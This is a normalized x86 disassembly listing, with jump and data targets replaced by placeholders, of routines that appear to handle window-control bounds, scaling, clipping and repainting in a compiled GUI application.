push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43f420
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43f444
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43f46c
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43f490
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43f4b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43f5af
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_4034e4
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f5b6
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4176b4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_4034e4
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4034e4
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_417414
sub_43f5c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4400f8
mov edx edi
mov eax ebx
call sub_43f670
mov edx edi
mov eax ebx
call sub_440f08
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f62c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43f670
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43f6cc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f6f8
mov edx eax
mov ecx esp
mov eax esi
call sub_416114
mov edx esp
mov eax ebx
call sub_43fb3c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f710
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f6b4
mov ecx esp
mov edx esi
call sub_416114
mov edx esp
mov eax ebx
call sub_43fb3c
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f738
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f7b9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f7c0
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
sub_43f7c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f7f4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f820
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45acdc
sub_43f850
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_440e64
sub_43f8cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_4206f0
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_42070c
sub_43fa98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43fb2e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41d5f0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43fcb0
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404444
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb35
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43fce0
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43fb3c
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43fb84
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
test esi esi
je r-xdata
mov edx ebx
call sub_443110
mov edx ebx
mov eax esi
call sub_44303c
mov eax ebx
call sub_43f304
sub_43fbd0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_4034e4
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_440e64
mov eax edi
mov si 0xffd0
call sub_4034e4
sub_43fc68
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_453a4c
mov edx ebx
mov eax esi
call sub_41d168
sub_43fc8c
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_440e64
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_440e64
pop ebx
retn
sub_43fcb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43fc24
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404128
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43fc34
sub_43fce0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fd35
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43fcb0
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404444
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fd3c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
call sub_4044f8
mov edx eax
mov eax ebx
call sub_43fc8c
sub_43fd60
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_42064c
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_440e64
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_42064c
mov [ ebx + 0x84 ] eax
sub_43fee8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43fed8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43ce80
mov eax esi
call sub_43ce80
jmp r-xdata
sub_43ff20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4175cc
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_417460
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_4175ec
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4400f8
mov eax ebx
call sub_456c2c
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4034e4
sub_43ffa0
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43ff20
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43ff20
jmp r-xdata
sub_43ffc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44005a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440061
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
sub_44006c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4175cc
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_417570
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43f650
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4400f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4467d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43f650
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4464d0
push eax
call InvalidateRect
push ebp
call sub_44006c
pop ecx
test al al
je r-xdata
mov al 0x1
sub_440194
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_456c04
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_440e64
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4034e4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4401f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4467d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4464d0
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4402d1
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4442a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4464d0
push eax
call ReleaseDC
retn
sub_440358
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax edi
call sub_440e98
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43f7f4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d00
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_440e64
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43e000
sub_44042c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_440468
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4404b4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4404e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43fc54
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43fc40
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402b18
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402b18
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4464d0
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4405c4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_440610
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
